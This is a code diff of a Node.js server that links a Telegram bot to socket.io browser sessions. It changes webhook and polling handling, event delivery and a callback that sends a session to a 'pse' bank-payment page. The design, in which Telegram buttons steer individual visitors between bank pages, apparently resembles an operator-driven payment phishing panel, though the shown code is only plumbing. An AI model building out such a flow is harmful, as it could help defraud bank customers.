@@ -176,10 +176,8 @@ function getPublicBaseUrl() {
 }
 
 function shouldUseTelegramWebhook() {
-    if (process.env.TELEGRAM_POLLING === 'true' || process.env.TELEGRAM_POLLING === '1') return false;
-    if (process.env.USE_TELEGRAM_WEBHOOK === 'true' || process.env.USE_TELEGRAM_WEBHOOK === '1') return true;
-    if (process.env.RENDER === 'true' || process.env.RENDER_SERVICE_ID) return true;
-    return Boolean(getPublicBaseUrl() && NODE_ENV === 'production');
+    // Solo webhook si lo pides explícito (la versión antigua usaba polling y funcionaba)
+    return process.env.USE_TELEGRAM_WEBHOOK === 'true' || process.env.USE_TELEGRAM_WEBHOOK === '1';
 }
 
 async function startTelegramPolling() {
@@ -210,10 +208,15 @@ async function startTelegramWebhook() {
         const fullUrl = `${baseUrl}${TELEGRAM_WEBHOOK_PATH}`;
         await bot.setWebHook(fullUrl, {
             allowed_updates: ['callback_query', 'message'],
-            drop_pending_updates: false
+            drop_pending_updates: true
         });
+        const info = await bot.getWebHookInfo();
+        if (!info?.url) {
+            console.error('❌ Telegram no registró el webhook (url vacía)');
+            return false;
+        }
         telegramUpdateMode = 'webhook';
-        console.log(`🤖 Telegram WEBHOOK activo (sin 409): ${fullUrl}`);
+        console.log(`🤖 Telegram WEBHOOK activo: ${info.url} (pendientes: ${info.pending_update_count || 0})`);
         return true;
     } catch (err) {
         console.error('❌ No se pudo configurar webhook:', err.message);
@@ -227,7 +230,7 @@ async function initTelegramUpdates() {
     if (shouldUseTelegramWebhook()) {
         const ok = await startTelegramWebhook();
         if (ok) return;
-        console.warn('⚠️  Webhook no disponible, usando polling como respaldo');
+        console.warn('⚠️  Webhook falló — usando POLLING (modo antiguo que funcionaba)');
     }
 
     if (!isTelegramPoller) {
@@ -235,6 +238,7 @@ async function initTelegramUpdates() {
         return;
     }
 
+    if (!bot.listenerCount('polling_error')) {
     bot.on('polling_error', async (err) => {
         const code = err && (err.code || err.response?.statusCode);
         const msg  = err && (err.message || '');
@@ -261,6 +265,7 @@ async function initTelegramUpdates() {
         console.error('Telegram polling_error:', msg || err);
     });
     bot.on('error', (err) => console.error('Telegram bot error:', err && err.message));
+    }
     await startTelegramPolling();
 }
 
@@ -416,15 +421,14 @@ function findSocketsForSession(sessionId) {
     return found;
 }
 
-/** Envía evento a todos los sockets vivos de la sesión (mismo worker) */
+/** Envía evento al cliente (igual que la versión antigua: room + respaldo por socket) */
 function deliverToSession(sessionId, event, payload, fromCluster = false) {
+    io.to(sessionId).emit(event, payload);
+
     const sockets = findSocketsForSession(sessionId);
     for (const sock of sockets) {
         sock.join(sessionId);
         sock.emit(event, payload);
-    }
-    if (sockets.size === 0) {
-        io.to(sessionId).emit(event, payload);
     }
 
     if (!fromCluster && cluster.isWorker && typeof process.send === 'function') {
@@ -937,15 +941,7 @@ io.on('connection', (socket) => {
     socket.on('disconnect', () => {
         const session = sessionManager.getSessionBySocket(socket.id);
         if (session) {
-            const sid = session.sessionId;
-            const deadSocketId = socket.id;
-            console.log('❌ Cliente desconectado:', deadSocketId, '| Sesión:', sid);
-            setTimeout(() => {
-                const current = sessionManager.getSession(sid);
-                if (current?.socketId === deadSocketId) {
-                    sessionManager.clearSocket(sid);
-                }
-            }, 12000);
+            console.log('❌ Cliente desconectado:', socket.id, '| Sesión:', session.sessionId);
         }
     });
 });
@@ -1020,9 +1016,9 @@ async function handleCallbackQuery(callbackQuery) {
             deliverToSession(sessionId, 'actionFollow', {
                 sessionId,
                 action: 'follow',
+                nextPage: 'pse',
                 bank,
-                bankRoute,
-                nextPage: bankRoute ? 'bank' : 'pse'
+                bankRoute
             });
             await bot.answerCallbackQuery(callbackId, { text: '\u2705 Continuar a PSE' });
             return;
